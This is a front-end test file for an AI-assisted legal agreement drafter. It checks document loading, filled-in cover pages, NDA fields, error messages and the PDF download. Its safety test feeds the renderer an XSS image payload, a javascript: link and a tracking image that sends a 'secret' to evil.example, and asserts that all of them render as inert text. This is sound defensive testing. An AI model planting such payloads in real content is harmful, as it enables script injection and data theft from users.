import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { chatRequests, fakeApi, type TurnChanges } from "@/test-utils/fakeChat";
import DocumentCreator from "./DocumentCreator";

vi.mock("next/navigation", () => ({ useRouter: () => ({ push: vi.fn() }) }));

type User = ReturnType<typeof userEvent.setup>;

function setup() {
  const user = userEvent.setup();
  render(<DocumentCreator />);
  const preview = screen.getByRole("article", { name: "Agreement" });
  return { user, preview };
}

/** Sends a chat message and waits for the AI's (fake) reply. */
async function say(user: User, text: string, reply = "Got it.") {
  await user.type(screen.getByLabelText("Message"), `${text}{Enter}`);
  await screen.findByText(reply);
}

/** Sends messages whose fake AI replies make the given changes, in order. */
async function chat(user: User, ...turns: TurnChanges[]) {
  const fetchMock = fakeApi(...turns.map((t, i) => ({ reply: `Reply ${i + 1}`, ...t })));
  for (let i = 0; i < turns.length; i++) await say(user, `Message ${i + 1}`, turns[i].reply ?? `Reply ${i + 1}`);
  return fetchMock;
}

/** Waits for the chosen document's cover page to render. */
async function coverPage(preview: HTMLElement, title: string) {
  await within(preview).findByRole("heading", { level: 1, name: title });
}

/** Text of the paragraph that follows a cover page heading in the preview. */
function sectionText(preview: HTMLElement, heading: string): string {
  const h = within(preview).getByRole("heading", { level: 3, name: heading });
  return h.nextElementSibling?.textContent ?? "";
}

function row(preview: HTMLElement, label: string): string[] {
  const r = within(preview).getByRole("row", { name: new RegExp(`^${label}`) });
  return within(r)
    .getAllByRole("cell")
    .map((c) => c.textContent ?? "");
}

describe("DocumentCreator", () => {
  beforeEach(() => {
    // Only fake Date so userEvent's timers still run.
    vi.useFakeTimers({ toFake: ["Date"] });
    vi.setSystemTime(new Date(2026, 9, 16, 12, 0, 0));
  });

  afterEach(() => {
    vi.useRealTimers();
    vi.unstubAllGlobals();
  });

  describe("before a document is chosen", () => {
    it("shows the chat, an empty agreement and a disabled download", () => {
      fakeApi();
      setup();
      expect(screen.getByRole("heading", { level: 1, name: "Prelegal · New agreement" })).toBeInTheDocument();
      expect(screen.getByRole("region", { name: "Chat with the Prelegal assistant" })).toBeInTheDocument();
      expect(screen.getByText(/Your agreement will appear here/)).toBeInTheDocument();
      expect(screen.getByRole("button", { name: "Download PDF" })).toBeDisabled();
    });

    it("sends an empty draft with no document", async () => {
      const { user } = setup();
      const fetchMock = await chat(user, {});
      expect(chatRequests(fetchMock)[0].draft.documentId).toBeNull();
      expect(screen.getByText(/Your agreement will appear here/)).toBeInTheDocument();
    });

    it("shows the CC BY 4.0 attribution", () => {
      setup();
      expect(screen.getByRole("link", { name: "CC BY 4.0" })).toHaveAttribute(
        "href",
        "https://creativecommons.org/licenses/by/4.0/",
      );
    });
  });

  describe("a document from the catalog", () => {
    it("loads the chosen document and shows its cover page and standard terms", async () => {
      const { user, preview } = setup();
      const fetchMock = await chat(user, { documentId: "Pilot-Agreement" });
      await coverPage(preview, "Pilot Agreement");
      expect(fetchMock).toHaveBeenCalledWith("/api/documents/Pilot-Agreement");
      expect(screen.getByRole("heading", { level: 1, name: "Prelegal · Pilot Agreement" })).toBeInTheDocument();
      expect(screen.getByRole("button", { name: "Download PDF" })).toBeEnabled();
      expect(within(preview).getByRole("heading", { level: 2, name: "Cover Page" })).toBeInTheDocument();
      expect(within(preview).getByText(/During the Pilot Period and subject to the terms/)).toBeInTheDocument();
      expect(preview.innerHTML).not.toContain("orderform_link");
    });

    it("fills in key terms, parties and today's effective date", async () => {
      const { user, preview } = setup();
      await chat(user, {
        documentId: "Pilot-Agreement",
        terms: { "Pilot Period": "90 days", "Governing Law": "Delaware" },
        party1: { name: "Ada Lovelace", company: "Analytical Ltd" },
        party2: { company: "Enigma Inc" },
      });
      await coverPage(preview, "Pilot Agreement");
      expect(row(preview, "Pilot Period")).toEqual(["Pilot Period", "90 days"]);
      expect(row(preview, "Governing Law")).toEqual(["Governing Law", "Delaware"]);
      expect(row(preview, "Effective Date")).toEqual(["Effective Date", "October 16, 2026"]);
      expect(row(preview, "General Cap Amount")[1]).toBe("________________");
      expect(within(preview).getByRole("columnheader", { name: "CUSTOMER" })).toBeInTheDocument();
      expect(row(preview, "Print Name")).toEqual(["Print Name", "Ada Lovelace", ""]);
      expect(row(preview, "Company")).toEqual(["Company", "Analytical Ltd", "Enigma Inc"]);
    });

    it("sends the draft with today's effective date on the next turn", async () => {
      const { user, preview } = setup();
      const fetchMock = await chat(user, { documentId: "Pilot-Agreement", terms: { "Pilot Period": "90 days" } });
      await coverPage(preview, "Pilot Agreement");
      const second = fakeApi({ reply: "Next" });
      await say(user, "more", "Next");
      const { draft } = chatRequests(second)[0];
      expect(draft.documentId).toBe("Pilot-Agreement");
      expect(draft.terms).toEqual({ "Pilot Period": "90 days", "Effective Date": "2026-10-16" });
      expect(fetchMock).toHaveBeenCalledTimes(2);
    });

    it("starts a fresh draft when the AI switches documents", async () => {
      const { user, preview } = setup();
      await chat(
        user,
        { documentId: "Pilot-Agreement", terms: { "Pilot Period": "90 days" }, party1: { company: "Acme" } },
        { documentId: "sla", terms: { "Target Uptime": "99.9%" } },
      );
      await coverPage(preview, "Service Level Agreement");
      expect(row(preview, "Target Uptime")).toEqual(["Target Uptime", "99.9%"]);
      expect(within(preview).queryByText("90 days")).not.toBeInTheDocument();
      expect(row(preview, "Company")).toEqual(["Company", "", ""]);
    });

    it("tries loading the document again on the next turn after a failure", async () => {
      const { user, preview } = setup();
      const api = fakeApi({ documentId: "sla", reply: "Reply 1" }, { reply: "Reply 2" });
      let failNext = true;
      vi.stubGlobal(
        "fetch",
        vi.fn<typeof fetch>(async (input, init) => {
          if (String(input).startsWith("/api/documents/") && failNext) {
            failNext = false;
            return new Response("{}", { status: 500 });
          }
          return api(input, init);
        }),
      );
      await say(user, "An SLA", "Reply 1");
      expect(await within(preview).findByText(/Couldn't load the document \(500\)/)).toBeInTheDocument();
      await say(user, "Try again", "Reply 2");
      await coverPage(preview, "Service Level Agreement");
    });

    it("explains when the document can't be loaded", async () => {
      const { user, preview } = setup();
      await chat(user, { documentId: "no-such-document" });
      expect(await within(preview).findByText(/Couldn't load the document \(404\)/)).toBeInTheDocument();
    });
  });

  describe("the Mutual NDA", () => {
    async function startNda(user: User, preview: HTMLElement, changes: TurnChanges = {}) {
      await chat(user, { documentId: "Mutual-NDA", ...changes });
      await coverPage(preview, "Mutual Non-Disclosure Agreement");
    }

    it("keeps its own cover page with defaults and today's date", async () => {
      const { user, preview } = setup();
      await startNda(user, preview);
      expect(sectionText(preview, "Purpose")).toBe("Evaluating whether to enter into a business relationship with the other party.");
      expect(sectionText(preview, "Effective Date")).toBe("October 16, 2026");
      expect(sectionText(preview, "MNDA Term")).toBe("Expires 1 year from Effective Date.");
      expect(sectionText(preview, "Governing Law & Jurisdiction")).toBe("Governing Law: ________________");
      expect(within(preview).getByRole("heading", { level: 1, name: "Standard Terms" })).toBeInTheDocument();
      expect(within(preview).queryByRole("heading", { name: "Key Terms" })).not.toBeInTheDocument();
    });

    it("fills in NDA fields and both parties", async () => {
      const { user, preview } = setup();
      await startNda(user, preview, {
        nda: { governingLaw: "Delaware", jurisdiction: "New Castle, DE", mndaTermType: "untilTerminated" },
        party1: { name: "Ada Lovelace", company: "Analytical Ltd", noticeAddress: "ada@analytical.example" },
        party2: { name: "Alan Turing", company: "Enigma Inc" },
      });
      expect(within(preview).getByText("Governing Law: Delaware")).toBeInTheDocument();
      expect(within(preview).getByText("Jurisdiction: New Castle, DE")).toBeInTheDocument();
      expect(sectionText(preview, "MNDA Term")).toBe("Continues until terminated in accordance with the terms of the MNDA.");
      expect(row(preview, "Print Name")).toEqual(["Print Name", "Ada Lovelace", "Alan Turing"]);
      expect(row(preview, "Notice Address")[1]).toBe("ada@analytical.example");
      expect(preview.querySelector('a[href^="mailto:"]')).toBeNull();
    });
  });

  describe("safety", () => {
    it("shows HTML, images and javascript: links from the AI's values as text", async () => {
      const { user, preview } = setup();
      await chat(user, {
        documentId: "Pilot-Agreement",
        terms: {
          "Pilot Period": '<img src=x onerror="alert(1)"><b>bold</b>',
          "Governing Law": "[click](javascript:alert(1))",
          "Chosen Courts": "![tracker](https://evil.example/x.png?q=secret)",
        },
      });
      await coverPage(preview, "Pilot Agreement");
      expect(preview.querySelector("img")).toBeNull();
      expect(preview.querySelector("b")).toBeNull();
      for (const link of within(preview).queryAllByRole("link")) {
        expect(link.getAttribute("href") ?? "").not.toMatch(/^javascript:/i);
      }
    });
  });

  describe("download", () => {
    it("opens the print dialog to save a PDF", async () => {
      const print = vi.spyOn(window, "print").mockImplementation(() => {});
      const { user, preview } = setup();
      await chat(user, { documentId: "sla" });
      await coverPage(preview, "Service Level Agreement");
      await user.click(screen.getByRole("button", { name: "Download PDF" }));
      expect(print).toHaveBeenCalledTimes(1);
      print.mockRestore();
    });
  });
});
